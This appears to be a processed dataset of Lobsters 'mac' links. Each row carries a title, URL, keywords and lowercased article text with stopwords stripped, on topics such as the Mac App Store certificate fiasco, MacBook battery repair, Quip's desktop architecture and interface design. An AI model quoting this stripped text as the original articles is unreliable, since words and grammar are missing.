intuition daniel return amsterdam find mac app store issue abound manton buy ipad pro wait pencil two discus mac app store failure evolve substantially dig emotional high low enjoying surviving apple platform constraint glenn fleishman certificate accidental expiration due reasonable precaution software act sky falling good reason fail unless attack compromise underway yet apple infrastructure seemingly brittle happen inconvenienced unknown number mac app store software purchaser offloading frustration customerservice load developer rainer brockerhoff actually several different unfortunate problem first damaged dialog seems caused sort cache memory corruption system process coordinate implement gatekeeper app store update report say killing storeagentd process solves problem without rebooting system seem run fwiw everyone know dialog appears app allowed run affected checking done inside app second asking new appleid password caused app checking store receipt something strongly recommended apple since otherwise easy copy downloaded app another computer run remember early game widely pirated get new version app cert probably new one allowing leaf cert expire naturally apple pushed new certificate expires probably looking wrong place knowing certificate expired someone glanced root certificate noticed new date nothing new see course cert created update benjamin mayo apple emailed developer recent damaged apps bug affecting sizeable proportion o x user base getting repeated error app launch whilst reboot enough invalidate reload certificate cache people weird edge case apple say permanent fix caching issue included future o x software update rainer brockerhoff note apple email linked wrong documentation page neglected mention important receipt creation date issue pierre lebeaupin conceptually two security service mac app store provides drm protect developer unlicensed use app app pilfered modified passed modifier creation code signing protect user attacker tampering app moment app signed someone user supposedly trust moment run code signing nature relies digital certificate certificate expire hear good security reason archivist particularly care code signing even app tampered attacker archivist pristine copy data machine network nothing ever exit since code signing put user benefit last resort ability disengage otherwise done user benefit code signing update gu mueller maspocalypse gift keep giving get support family member bought thing year ago stopped working user continue find apps working rebooting update see also accidental tech podcast dan moren given mac tremendously well setting sale approaching sale volume io given apple take cut io mac app sale regardless disparate support two app store might behoove company spend little time bringing mac app store snuff tom harrington still finding new app damaged error week later john gruber put aside argument whether fiasco like ever happened first place take six day apple publicly respond explain happened since apple contacted developer select mac press people bought apps user probably never heard anything update rob griffith however simple one notsosimple mac app store really could place shop mac software instead place find apps meet apple narrow definition app beapple software quality bug code signing drm dropdmg eaglefiler gatekeeper mac mac app mac app store sandboxing top post stay uptodate subscribing comment r feed post
632,Lobsters,mac,Apple macOS,Inside Apple's perfectionism machine,http://mashable.com/2015/10/28/apple-phil-schiller-mac/,inside apple perfectionism machine,surface pro surface book,apple however growing time sea change pc industry devotion piece hardware may le important connection file content service cloud loom larger hardware use still matter schiller reject notion importance value great hardware diminished way said across board goal make best category choose compete reflected customer choosing product anyone else think people showing choice value quality beauty hardware diminishing never heard anyone say like keep stuff cloud take cheap piece hardware want ugly thing equal course nobody want schiller said also reject idea growing market hybrid specific laptop touch screen also happen tablet certainly offering today people trying create market based data able see still incredibly small niche may growing anything significant time tell told schiller mention microsoft name implication clear believe product like swiftly selling surface pro new surface book quite represent trend particular schiller nt believe people choosing product like mac appreciate innovation craftsmanship contends love important u something lucky never lost u customer really deeply love product customer adoration mac new phenomenon according schiller something go back first generation mac people felt attachment bond cared mac way would normally expect inanimate object said truth told knowing case certainly try support enhance delivering amazing product identifying
633,Lobsters,mac,Apple macOS,The Hassles of Replacing a Possibly-Viable Battery on a Mac Laptop,http://photofocus.com/2014/05/04/the-nightmare-of-replacing-a-battery-on-a-mac-laptop-why-your-machine-might-be-lying-to-you/,hassle replacing possiblyviable battery mac laptop,battery problem rechargeable battery machine say need service battery time something battery battery spend money battery failure mean failure meet apple standard start engine thought made reservation joint venture pro machine really pro long take change battery mac laptop service battery likely meaningless warning,battery seems creative professional life run battery ability work go anywhere time phone tablet laptop camera run battery problem rechargeable battery time rechargeable battery wear need replaced im talking losing charge rather total number charge battery hold used battery time suffer problem cycle battery recharged many time essentially stop able hold charge total failure greatly diminished capacity ive also personally battery bloat expand till point nearly rupturing case maximum capacity time battery become le efficient unable hold much charge find needing charge often disclaimer tell following story let clarify one thing im crossplatform kind guy use mac hp computer time professional life preference different task performance need disclaimer experience people may different machine say need service battery recently frustrating experience macbook pro top line machine year half old run latest operating system keep wellmaintained day new error popped id never seen mac told battery problem got generic service battery clicked battery status menu search help menu found description weird message service battery battery functioning normally may may notice change behavior amount charge hold take computer service continue use battery checked without harming computer road work wrote error week though mac kept telling battery needed attention struck weird made appointment local apple store get machine serviced time something computer keep telling something wrong figure better listen made appointment weekend thing le busy got first slot saturday loaded detailed description appointment system precise note abut whats wrong serial number etc identified exactly machine said wrong id need new battery thought would easy fix wrong arrived apple store tech checked machine message said battery failed make extra sure hooked ran diagnostic report tech verified battery failed informed repair would replied seemed like awful lot battery battery battery turn modern mac laptop battery battery quest make machine thinner apple made battery unserviceable user well removed much protective covering battery glued keyboard mean replace time even keyboard work fine next toss problem apple thought applecare machine apple extended warranty despite showing receipt showed bought time turn machine apple store actually fill online form register warranty buy apple store automatically attach anywhere else spend money since im one part lightly ask detail way battery failed minute back forth finally get tech clarify battery fails meet apple standard yes heard right battery failure mean failure meet apple standard warrant telling user make service appointment shell nearly asked machine risk damage nope problem id experience battery hold charge long last checked thats happens rechargeable battery got older still considered repair keyboard little worn could use longer lasting battery tech said thought could get applecare issue worked start engine okay going figured could pick machine end day maybe next morning nope long would take day yes three day swap battery three day repair something mac laptop every mac laptop supposed need done machine fails battery rated last le machine user nearly everyone buy mac laptop need replace battery unless programmed constantly upgrade well turn battery attached keyboard also logic board control lot computer difficult repair im told apple insane quest get laptop millimeter thinner standard repair like battery swap take day turn actually take day line really long apparently take several hour per machine thought made reservation make reservation scheduled day advance submitted detail including error message serial number doesnt matter tech informs even bother reading note minute call customer name point ask store manager politely point three day time service pro laptop sticker price seems ludicrous informs apple store really setup consumer need professional level service need sign apple optional coverage plan business called joint venture premium service cover machine one year addition apple care machine point lost pro machine really pro doesnt matter buy top end machine case machine year office want pro machine serviced one day turnaround pay extra top extra already paid warranty point leave store contact local apple certified reseller extensive inhouse repair center originally quoted day service except turn apple let theyre allowed keep part stock apple requires run diagnostic machine verify problem pointed apple ran diagnostic test didnt matter reseller run apple would send part paying course overnight express shipping long take change battery mac laptop appears fastest get mac laptop battery changed day make least two car trip apple environmentally conscious company failed red tape bureaucracy created system standard part replaced every laptop useful life requires minimum two round trip car ride express overnight shipment single part itll take twofour day without machine need run business yeah crazy perhaps im getting seems like simple battery swap involve much effort service battery likely meaningless warning key take away believe mac say battery failed truth battery loses ability hold original charge apple want machine prepared give day failed meet apple standard thought welcome encourage share story perhaps apple figure better way service customer waste much gas fuel charge
634,Lobsters,mac,Apple macOS,Freeze - the ultimate Amazon Glacier file transfer client for Mac,https://freezeapp.net,freeze ultimate amazon glacier file transfer client mac,amazon glacier mac,amazon glacier mac easy access archive convenient app cocoa java
635,Lobsters,mac,Apple macOS,How To Shuffle and Sample on the Command-Line,http://blog.jpalardy.com/posts/how-to-shuffle-and-sample-on-the-command-line/,shuffle sample commandline,shuffling sampling wikipedia shuffle sample many thing look,shuffling shuffle commandline shuf seq sequence seq shuf sequence shuffled linux already shuf mac o x brew install coreutils installs shuf gshuf g gnu usually alias gshuf shuf fix could use sort r sort randomsort poorman shuf larger file terrible idea sort sort whole file shuffling sampling sampling selection subset individual within statistical population wikipedia pas n flag shuf seq shuf n pick allow repeated pick value r flag seq shuf r n pick repeat seq shuf n pick without repeat picking one thing simply seq shuf n pick shuffle sample every time faced many thing look trust picking representative sample easy say pick first miss problem happened later example might system generates file directory might hundred thousand file want get feel content find type f shuf n pick file might want get feel happening log file cat varlognginxaccesslog shuf n depending specific situation might bring interesting question many thing look
636,Lobsters,mac,Apple macOS,Apple Is Sweating the Details on iMac,https://medium.com/backchannel/exclusive-why-apple-is-still-sweating-the-details-on-imac-531a95e50c91,apple sweating detail imac,course proclaimed pc going like truck macintosh number,yeah agreed bergeron extended mac team since right like many reason apple world valuable company tim cook celebrated supply chain maester internalized focus innovation predecessor inculcated culture jony ive drawn global raf making apple design icon marketing branding practice set industry standard visit lab legacy product computer made suggests another reasonsweating detailsa lessthanperfect noise product killer even official bug nonetheless apple engineer determined make sure new imac magic mouse made better sound glided across desktopof course far imacs concerned larger question lingers even bother desktop computer month ago apple ceo tim cook showing new humongous ipad pro new keyboard proclaimed ipad clearest expression vision future personal computing make imacs relic fading past steve job foreshadowed question pc going like truck said conference may still going around one x people need could mobile age imacs even shiny new one dull engine computational load bearing phil schiller simple say phil schiller apple senior vp worldwide product marketing amazing time different idea competing computing life great love thought long deep choice want offer customer one ipad many thing want pc many people choose make primary computing device true ipad pro ever everybody people decide nothing thing need life well mac schiller fact grand philosophical theory apple product line put product continuum ideally using smallest possible gadget much possible going next largest gizmo line computer say one offering computer something unique made simple form pretty eternal job watch thing wrist need pick phone often job phone thing maybe need ipad always trying striving job ipad powerful capable never need notebook like need notebook add keyboard thing job notebook make never need desktop right decade leaf poor desktop end line job good question answer job challenge think computer thing computer ever done powerful capable need desktop capability say schiller competing notebook thinner lighter need brings u new imac product line despite fact apple revenue profit dominated iphone success still considers macintosh serious part business according schiller imac significant part apple break imac sale macintosh number lately bit five million per quarter sell ten time many iphones macintosh care deeply say apple vp macintosh product marketing brian croll company since
638,Lobsters,mac,Apple macOS,OS X 10.11 El Capitan: The Ars Technica Review,http://arstechnica.com/apple/2015/09/os-x-10-11-el-capitan-the-ars-technica-review/,o x el capitan ar technica review,enlarge leopard delayed protest contrary release date el capitan trap thoroughly ecosystem never leave io two week ago table content,enlarge putting el capitan pace wide range hardwareandrew cunningham poor o x ca nt get respect apple mac operating system playing second fiddle iphone since leopard delayed make room thennew smartphone despite occasional protest contrary o x nt apple apple eye since second icloud second imessage second postscottforstall flattening operating system added insult apple could nt find time twohour product event mention o x mac except passing mainly context platform got release date el capitan day event posted apple site mentioned onstage o x obviously still important apple one company want trap thoroughly ecosystem never nt get lead charge anymore subtle difference el capitan actually seeing new feature come io o x time rather existing io first trickling mac later many biggest noticeable change one saw io two week ago new split screen multitasking mode tweak multitouch gesture change service like spotlight overhauled apps like note fall category others like system integrity protection merely iosinspired really first time several year io o x felt like gotten needed amount attention get spend release slow lane apple put marketing muscle behind newer platform like apple watch new apple tv like io mountain lion snow leopard el capitan refinement yosemite big statement o x look like el capitan relatively meek hey couple neat trick show table content listing image apple
639,Lobsters,mac,Apple macOS,Your OS sucks,https://www.facebook.com/notes/kevin-frei/your-os-sucks/10153643564654427?_fb_noscript=1,o suck,,celebrating one year anniversary working facebook couple month back started putting together summary thing learned year neck deep software industry spent year macos back called system couple year unix land linux land normal people ever heard year microsoft fully immersed msft koolaid bit year facebook macbook pro abound engineer connect linux dev server interesting stuff entire postcollege career focused particular niche software development called compiler understanding nerdy software developer talk detail may understand care bit foul mouth read riskcoming world highly productive using window brief stint mac linux spent time becoming moderately productive mac linux say authority o suck nt care o talking suck truly differentiating factor people point feature blah much better insert favorite o kind missing point general purpose computing platform matter certain thing good certain thing bad reason suck big fairly important thing truly terrible game year desktop form factor nt changed significantly since old apple lisa year ago seriously screen nicer pointing device svelte still screen pointing device keyboard attached start o set experience window used every version window professionally since window nt exception window window rather drudge past carry window xp wonderful really nt window vista crime nature really probably reason think focus window window sucked many level wo nt go nt done much window yet appears suck similar way window suck window get pretty large swath edge case right general usability barely passable many different hoop jump add printer monstrosity forced use talk mac linux system long take wake sleep atrocious installer technology going crap computer sufficient measure force completely pave machine start nt even get started command line useful tool command line usage bad freely available dramatically better version microsoft distributing operating system least developer tool year nt weird corner case long take get machine back usable state window update decided shit hard drive dy worst thing ever reinstall o requires window updatereboot cycle machine safe use internet saying mac secure clearly saying requiring download update install restart download another update restart stupidest thing ever way back system way get new hard drive plug restore microsoft decided making capability discoverable bad idea window hidden discoverable live chicken sacrifice staring full screen start menu cursing existence every release way configure system put shuffler reorganized never really remember change one thing figured scratch surface o may decide like write software hahahaha sucker nothing ever written actually usable anything look like might usable longer actively supported microsoft anymore know routine write inmemory database file someone wrote c year ago decided pursue dream becoming penguin psychologist like write new ui top get rewrite whole damn thing microsoft decided file io take nt ever allowed synchronously god forbid might actually fucking brain head synchronous file io background thread get start window hate o sucksmoving risky statement sucking linux poster boy nerdy fanboihood open source recompile thing whatever want spent year learning everything operating system great create write run forever software universe possible even good idea nt exist linux security exploit like window macos constantly keep hodgepodge library sdk tool daemon running machine date people pick distribution ubuntu debian red hat fedora come mind actually lie first one come mind centos criminal distro use internally facebook conglomeration bit pay group engineer well deserved pile money tweak maintain secure want anything get search web pray question already answered stackoverflow nt completely screwed ask question get army vocal asshole belittling able search poorly written man page figure add line wtf file create wtfd directory underneath whyisthisfolderhere configuration folder work fine using version openbitemeso library later version switch order wtfd whyisthisfolderhere directory realize running discussed anywhere help doc mention people either ignore mock applying patch git repo subversion server cv repository stored someone private nfs server belarus use gnome desktop kde hideous ui layer top crap clearly designed year old kid finished binge watching every transformer movie know normal feel like drinking red bull every hour past month like actually try anything real linux machine really screwed graphic card driver probably shit typed yum update updated version version incompatible amvidia graphic card bought someone else told worked well linux meant work well kernel debugger attached open source wifi router linux hate o sucksnow religiously defended shitty o seen macos operating system ever shrinking number zealot claim everything macintosh perfection decree completely wrong give amount ancient history usability back bad ol day mac easier configure keep working window today want anything nt mainstream completely totally fucked want click around web browser macbook going fine fine way cheaper device go get tablet chromebook browser browser inside browser o claim pointless stuck misery htmljscss chrome run pretty similarly macos linux window chromeos firefox want anything real mac quickly discover much suck virtually decent software macos apple decade crapped developer apple vaunted human interface guideline stuck using top line ui menu top folk massive pile little useless icon right wan na use external monitor get use squinting macos nt scale ui element shit unless shell hundred dollar monitor writing code stuck xcode almost nothing documented authoring code iphone careful see phone plugged mac might change build actually build wan na try connect mac another mac vnc arguably disgusting least usable way anything like better stick ssh vnc coworker asshole walk mac start sending email biggest beef macos goddamned mouse absolutely excuse need use mouse way anything wan na move window around go get addin watch addins start crashing wan na look menu option hit explore arrow key grab mouse wan na use app get learn whole pile custom short cut wacky feature let talk mouse mouse requires hand hand finger thumb apple decided generally use hand anything complex one button mouse confusing far simpler using one button mouse holding button keyboard absolute complete total inability run shitty halfstolen o virtual machine kind comical earliest virtual machine software existence actually ran macintosh emulating window machine slow buggy technical reason emulating powerpc pretty bad macos run pretty standard though absurdly overpriced hardware vm piece cake apple damned give way run multiple isolated copy precious o would let roll back system known good state piece hardware let talk stability apple support given moment configuration hardware probably exaggeration used total different device past month macbook pro mac book pro ash tray er mean mac pro crash freeze pretty regular basis house pc custom chunk hardware pieced together past year sort different motherboards cpu ram stick ssd hard drive monitor peripheral crash freeze rarely seen perhaps blue screen past year seen least sad mac apple perfect fault wanting try use computer fashion nt aggravate wrist o x stupid code name hate o sucksso look get high horse crappy o thing comfortable yes major part crappy o suck people make o nt give shit thing actually really matter significant minority people o suck o sucknow nt get started dumb smart phone disclaimer sorry catalog everything every o suck lot thing suck os even scratched surface please feel free add complaint comment section promise care clear know engineer work wide variety software work software disparaged know really impugning skill folk claiming better ego remain intact know making software hard shipping software even harder one reason software suck hold personal grudge anyone stuff personal grudge reserved far trivial silly thing
640,Lobsters,mac,Apple macOS,React with C++: Building the Quip Mac and Windows Apps,https://medium.com/@btaylor/react-with-c-building-the-quip-mac-and-windows-apps-c63155c1531b,react c building quip mac window apps,react c building quip mac window apps introduction quip launched quip desktop web mac window iphone ipad android phone android tablet apple watch quip desktop architecture quip desktop fast offline support share code react sending html react protocol buffer ajax leveldb data api flux action data model websocket object react mixin index update performance hardware reference manual methodology html version hardware reference manual computer screenflow download quip desktop download app quipcomdownload technical link,react c building quip mac window appsthis post built quip desktop quip modern productivity suite designed team collaboration tried already download appintroductionfrom beginning built quip work natively multiple platform launched supported web iphone ipad launch quip desktop today quip available platform web mac window iphone ipad android phone android tablet apple watchsince quip consciously lean company support platform engineer spend lot time thinking achieve polished native experience platform maximizing code reuse quip desktop specifically knew wanted web site desktop app share much ui code possible since experience similar yet also knew wanted build native app good better legacy productivity suiteswe ended designing unique architecture based custom c library reactbased ui shared web desktop apps happy productivity gain code reuse really happy user experience desktop app post highlevel overview approacharchitectureour goal quip desktop straightforward fast data stored locally synced passively loading document require network roundtrip fast opening file hard driveoffline support app work offline online primary operation editing sending message sharing require network connectionshare code app share much code desktop web site possible want maintain three different version app across window mac webaround time designing desktop app discussing porting web site react major part port transitioning web site sending html sending raw data client would render javascript quickly realized new databased approach ui would work equally well whether data retrieved remote server local databaseafter prototype settled architecture based react user interface designed uniform data model api based protocol buffer power react user interface implemented api twice set ajaxbased server handler web app set function call c library desktop mobile appsso using quip mac app running javascript code using browser perform action like editing document mac app make call c library backed local database edit document web browser client make exact api call sent via ajax quip web servershere rough diagram architecture c library call syncer backed leveldb database store data access quip message document name colleague whenever make change local database passively synchronize quip server local instance always uptodate require network connection function correctlyin web app access local database use simple inmemory version syncer interface store data receive serverdata apiin quip every api call mutates data performs action called handler similar spirit flux action make new handler write protocol buffer message defines request response pseudocode version handler send message message sendmessagehandler message request optional string text optional sentusec repeated file fileattachments message response optional message sentmessage compose message quip construct sendmessagehandlerrequest object javascript serialize protocol buffer json invoke appropriate api platformin mac window app send serialized request c library via custom javascripttonative bridge library writes new message leveldb database return response immediately change make reflected ui instantly without waiting network roundtrip bool handler sendmessage const sendmessagehandler request request sendmessagehandler response response message message response mutablesentmessage string serialized message serializetostring serialized return leveldb put message id serialized ok browser send serialized request ajax api ie make http request http quipcomcallhandler python server server handler look lot like c function save response mysql database return response http body def sendmessagehandler request response sendmessagehandlerresponse backendwritemessagetodatabase responsesentmessage selfwritepbjson response mentioned c library passively synchronizes change leveldb database server message wrote local leveldb database would make server almost instantly wifi would synchronized next time internet accessdata modelsince quip designed realtime collaboration get lot realtime update using app desktop web apps connect websocket update stream colleague edit document send message also stream usage using quip multiple device wanted data model react made easy respond change network without writing lot custom code data type app currently data type document message user came approach based two simple abstraction object index enable react component listen change uniform wayobjectsevery object quip defined protocol buffer encapsulates data ui need display every object globally unique id bunch custom field message document optional string id optional string title optional string createdbyid message message optional string id optional string authorid optional string text mysql database server leveldb database native client store roughly object make api call synchronization easywhen want write react component render object make object property component use special react mixin called modelobjectlistener ensure component get rerendered whenever object change var messagebubble reactcreateclass mixins modelobjectlistener proptypes message reactproptypesinstanceof message isrequired render function return div class messagebubble thispropsmessagegettext div modelobjectsforprops function prop return propsmessage modelobjectlistener mixin register component listen change object get update whether websocket result handler invocation iterate object update look component registered via modelobjectlistener rerender relevant componentsindexesevery list object app eg list message next document list document folder called index index unique name sorted list object id message index optional string indexid message entry optional string objectid optional string sortvalue repeated entry entry id message thread index might message documentid index section document might section documentid writing react component render index look lot like object example var messagelist reactcreateclass mixins modelindexlistener proptypes messageindex reactproptypesinstanceof index isrequired render function return div class messagelist thispropsmessagelistforeach function messageid return messagebubble message messageget messageid div modelindexesforprops function prop return propsmessageindex modelindexlistener mixin register component listen change index whenever change message index stream websocket simply insert changed entry index list automatically rerendersupdatesevery react component quip built object index given uniformity every update server c library whether response api call update websocket exact structure list changed object list changed index message change repeated object changedobjects repeated index changedindexes main controller app simply dispatcher accepts data structure caching rerenders component whenever update come simple model make component app update realtime remove need write special code deliver update data typesperformancethe application performance exceeded expectation even optimistic engineer beta tester told u app load document quickly jarringwe benchmark quantify fast new architecture really benchmark measured time take load big document case hardware reference manual quip desktop quip web microsoft word google doc machine complete methodology result telling quip desktop load almost twice fast quip web even fast internet connection load time faster microsoft word google doc even close took time longer load surprisingly google doc offline even slower methodologyan html version hardware reference manual imported microsoft word version cleaned slightlythe resulting content repeated time better simulate original document html version first chapter resulting file see attachment imported quip computer document page long approximately size pdf document opened respective desktop apps word quip already running without previously loaded document session loading time measured recording screen screenflow counting frame fps user gesture open document content appearing without picture fully loaded document opened inapp document browsing ui quip google doc panel microsoft wordrecordings done time application result averagedtests conducted macbook pro retina mid ghz core gb ram running mac o x chrome new profile used quip web google docsdownloadquip desktop run mac version window version free use download app visit quipcomdownload laptoptechnical link
641,Lobsters,mac,Apple macOS,Haskell for Mac,http://haskellformac.com/,haskell mac,,copy applicative utrecht netherlands right reserved apple apple logo macbook pro mac o x trademark apple inc registered u country mac app store service mark apple inc
642,Lobsters,mac,Apple macOS,Home Row Computing on Macs,http://duartes.org/gustavo/blog/post/home-row-computing-on-mac,home row computing mac,home row computing window takayama fumihiko seil open source karabiner open donate shiftit moom,number year configured desktop task done using home row key keyboard technique call home row computing take vi idea staying home row every app time without using mode thing simpler described implementation window since moved mac back qwerty keyboard away dvorak current setup described post us familiar vi key binding far suitable fairly painless configure mac never given problem thanks takayama awesome keyboard apps using joy really fast easy hand make feel like geek god use vim one benefit favorite editor apps plus weapon smug vimmers already use vim cherished hjkl key become universal pressing esc get hell lot easier important key must moved home row arrow key esc delete backspace forward delete another helpful home row task moving resizing window key remapping cap lock allow combination cap lock plus home key task mode involved cap lock work modifier like cmd fn key good start left several key unmapped customize setup get window management moment first step set cap lock action system preference keyboard modifier key must remap cap lock key code something else need small tool called seil open source map cap lock key like cmd option want go allout home row still benefit remapping like remap cap lock something guarantee conflict ever combo use key code apps key window keyboard safely absent apple keyboard business world least keyboard oyster maker seil also make karabiner open well outstanding keyboard customizer o x affiliation tool apart happy user year end using please donate go ahead install karabiner see plethora keyboard tweak possibility tweak toggled even native vi vim emacs mode however like builtin one built config go misc uninstall click open privatexml file libraryapplication supportkarabinerprivatexml define keyboard remapping scheme actually symlink dropbox file keep configuration consistent across machine rate file use implement discussed far drop file click reloadxml home row computing top prefixed sorting toggle done enjoy new keyboard layout search spotlight see fast smooth choose option finally window management area fumble quite bit resizing moving clumsily mouse favorite option make fast homerowfriendly shiftit open moom best ever spent affiliation others moom tower rest great twostep usage one hot key activates following key trigger command get define using window primitive like move zoom resize change monitor also define shortcut run command directly moom handy default action box arrow key used send window left right top bottom screen moom natively interprets hjkl arrow making easy stay home row associate key various command precise window position gold large monitor like apple thunderbolt remap cap lock global moom shortcut painless activation allows set shortcut something bizarre conflict anything would dog type currently improbable fn control command also cap lock n activating moom command cycle window two monitor shortcut keyboard map provided question let know know number keyboard nut use scheme window linux hope make easy mac
644,Lobsters,mac,Apple macOS,"NeXTEVNT 2015: Doug Menuez, Peter Graffagnino, Don Melton",http://www.youtube.com/watch?v=1ze6rI453YY,nextevnt doug menuez peter graffagnino melton,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature nextevnt doug menuez peter graffagnino melton youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature nextevnt doug menuez peter graffagnino melton youtube
645,Lobsters,mac,Apple macOS,The Post-Mac Interface,https://medium.com/@twomonthsoff/the-post-mac-interface-1031b94df77b,postmac interface,metaphor reality simulacrum http wwwtheatreaspenorgnewsaspendailynewsepicinthetent benefit drawback antimac reality suggests three conceptual model postmac simulacrum direct manipulation delegation benefit drawback anti mac delegation postmac direct uis delegated service ifttt see point describe command see point benefit drawback antimac describe command postmac see point consistency diversity consistency benefit drawback pen look like shoe antimac diversity postmac consistency wysiwyg see get represent meaning represent meaning benefit surprise drawback antimac represent meaning postmac represent meaning,let look mac design principle turn complementary antimac postmac variationsmetaphorsantimac principle reality postmac principle simulacrametaphors play important role user interface bootstrap understanding connecting ui using object experience idea familiar place often real life sometimes software itunes evokes car stereo evernote evokes planner notebook amazon loosely evokes shopping department store online shopping site evoke amazonles mi theatre aspen paris http wwwtheatreaspenorgnewsaspendailynewsepicinthetentmetaphors user interface like set theatre convince u believe thing looking like something else metpahor change expectation colored metaphor software say library convinced organized collection stuff course expect borrowing like public library expect itunes limited car stereo amazon shopping cart infinitely big metaphor bridge lot great design start metaphor aid understanding extend realize capacity people technologybenefits mac lauded ease use partly relied easytolearn metaphor instead forcing people learn computer worked desktop icon folder file instead command prompt directory file could click file drag folder put folder somewhere wanted desktop command prompt harder easily explained way metaphor kickstart learningin especially use metaphor provided familiar veneer wrap around idiomatic computer system unfamiliardrawbacks brief time google lot folk agog skeuomorphism literally representing source metaphor visually user interface think ibooks bookshelf faithfully recreated iphone wood grain infatuation skeuomorphic interface come wave popular recently shining example apple also rage g n wield skeuomorphic magic cap interface legitimate critique overly strict use metaphorsthe literal skeuomorphic desktop magic cap compose email opening drawer envelope clicking box picking postcard reliance metaphor cause problem first g n point often mismatch source ie realworld metaphor target ie software interpretation domain realworld library demand library card may borrow item itunes library need membership card exactly borrow item feature may missing either source target domain may thing present domain work differently mismatch source misunderstanding confusion think way google doc microsoft word different typewriter way instagram different polaroid camerasecond strict use metaphor especially skeuomorphic way introduce clumsy unnecessary indirectness pointandclick interaction example imagine clumsy interaction open virtual drawer virtual desk pull calculator put desk hit button could calculate tipthe antimac realityg n propose need develop new interface paradigm based structure computer system task user really perform rather paradigm enshrine outmoded technology provocatively suggest interface based structure computer system computer work hood general modeling task user really perform make sense interface based structure computer system le daysalan cooper noted voice interface design suggests three conceptual model used describe given piece software implementation model thing actually work mental model think thing work manifest represented model thing present u g n suggest product present u way closely mirror implementation model premise antimac principle forecast next generation user make learning investment computer counterproductive give interface based awkward imitation obsolete technology yes generation since grew computer know computer work grew magic apps good enough device require learn implementation modelspostmac simulacraas technology use daytoday become intricately connected real social life newish model emerged metaphor still abound usefully interface modeled antimac design principle reality closely tied mechanic underlying technology instead find term simulacraif write statement principle would much interface design today approximates system relationship real world even crudely facebook model simulacrum real social relationship facebook event kind simulacrumextension realworld social event product relies heavily approximation real life though user interface employ mainly triedandtrue standard control desktop web user interface element read see principle synergistic representation meaning principle ironically since computer become connected device become personal reflect deeper integration u people personal computer actually le personal use today principle simulacrum reflection technology new capacity aware self relationship many part livesin metaphor desktop used make unfamiliar technology file system accessible g n propose interface reflect underlying technology capacity dominant model obscuring technology altogether centering software around simulacrum everyday life healthy dose metaphor stillmany thing want technology simply relate computer work thing like conversation friend buying pair shoe driving somewhere think gps direction would mistake assume want powerful user interface manipulate bit computer software aside worth noting good deal technology company today model behavior consumer along manner system network phenomenon simulacrum even reductionist flawed trend direct manipulationantimac principle delegation postmac principle bothaccording direct manipulation user see visual representation object screen like file message video business card page word forth act interact physically representation word use interactive vocabulary point click drag type representation drag drop classic example direct manipulation practice hard imagine graphic designer composing magazine layout without direct manipulationbenefits like pushing button picking object otherwise manipulating thing real world see thing working happens interact itdrawbacks richest action might want computer take behalf would exceedingly difficult describe direct manipulation imagine graphic app task want duplicate star one thousand time rotating copy slightly different amount around axis tippytop point star spiral middle growing star slight random amount time almost way efficiently direct manipulation scripting describing delegating task easierg n present another example software installation software installation involves moving thousand file kind special place lot work direct manipulation point software installers become mainstream amusingly past year software installation often become simple dragging dropping single icon especially contemporary mac point still stand dragging dropping thousand file right place would awfully tediousnot much yet anti mac delegationg n alternate principle telling computer ideally nonnatural relatively accessible language work well graphic software case easier describe want precise language installer case effectively click install bypassing direct manipulation telling computer something u ideal case computer star trek next generation ask virtually anything work youhowever g n acknowledge barrier true delegation foremost among barrier true natural language processing requires true artificial intelligence ai nowhere near yet command line like widely used unix command line powerful depend strict idiosyncratic vocabulary syntax require great deal learning practice mention scripting language flourish briefly around potential solution well interface similar textbased game could negotiate user arrive mutual understandable instruction computerthe proposed design solution rely least two premise people need computer complicated thing hard describe direct manipulation willing learn nonnatural languagebased scriptinglike solution turn people want learn language implicitly computer work want computer ironically punting full resolution delegation aicomplete future luckily magic apps simple enough u something like delegation today instance basically ask google map give driving directionspostmac direct uis delegated service delegation product service direct manipulation ui interesting case illustrates gap ui design product service want experience design sense product perform delegation magical app behind scene think driving direction searching google case ui subordinate magic servicewhen come ui direct manipulation still rule scripting language way solving problem direct like get thousand file right place manipulate bunch musical note thing people need help want technology ui problem per se least may design problem strictly ui problem lot onebutton apps magical thing example delegation though increased role language like g n proposed similar install buttonsas direct manipulation continued place along merger technology routine activity life increasing magic happening behind scene got fancy new touchscreen doodadssmartphone tablet apps overwhelmingly networked singlepurpose program practically cry direct manipulation could natural tapping pinching smooshing thing directly surface ipad case technology want used certain way average tablet direct manipulationin word service background sophisticated indeed delegated operation calling lyft posting photo several social network getting driving direction ui use set thing motion remain fact best especially touch screen action direct manipulationin term delegation replace direct manipulation uis scripting language mostly failed gain traction negotiationlike uis including apple automator perform kind delegation g n refer bit actor cool service living though ifttt delegation seen apps horizon execute promise norm pointantimac principle describe command postmac principle see pointthis principle closely tied direct manipulation le state people interact thing visible screen use mouse point cursor thing whatever want manipulate directly thing screen might object file folder shape graphic program might menu principle state people choose whatever visible screenin apple human interface guideline principle written seeandpoint instead rememberandtype guideline point usees rely recognition recall remember arcane command thing visible screen simply need look screen every available object activity visually representedbenefits seeandpoint environment predictable hidden agent object work interactive vocabulary straightforward point click drag type singlebutton mouse make kind interface easy learn everything plainly visible interface work well novicesdrawbacks g n point lot thing represented given screen especially connected internet world action object always displayed pure seeandpoint ui plus display big put one scren interactive vocabulary limited combination noun screen verb singlebutton mouse keyboard offer indeed working limited languageantimac describe commandg n primary critique seeandpoint thing might want tell computer refer represented screen strictly true always practical concern especially world novice user spending lot time kind little singlepurpose appsthere case obviously useful refer something screen search google tacofino hour tacofino restaurant vancouver object screen excessive incoming email necessitated vocabulary describe filter huge music library demanded smart playlist ui describe abstract kind arbitrary playlist wantedpostmac see pointas someone kind find way around command line scripting language absolutely see provide principle richer interactive vocabulary power seeandpoint uis apply often postmac environment novice user expecting lot magic appsif paying attention note siri google equivalent perhaps google describeandcommand uis use siri time set reminder much else lot yet engage process negotiation time time usually fruitless clearer say almost anything want siri always play second fiddle seeandpoint like google search effectively describeandcommand ui future interface extremely powerfulfor powerful magical service like gps online shopping online banking video chatting forth simple seeandpoint uis facilitate thing want uis increasingly mobilefirst making even straightforward inclined fit small touchscreen primarily occasional use novice consider facebook one powerful application developed past decade revolutionary service ui almost entirely seeandpoint little describeandcommand use people search often besides typing name friend worth noting see point combined richcue mode probably predominant ui pattern mobile interface consistencyantimac principle diversity postmac principle consistencythe mac design principle consistency application consistent within consistent one another mean uis strive kind regularity help people learn thing work one way thing one way referring thing exception uis usually creative expression artistic unnecessary variation make apps difficult learn consistency achieved using standard control adopting platform pattern rigorous attention intentional variation design processbenefits user learns something work app know always work app like apps learn work app know work apps apple said edition human interface guideline benefit typical user 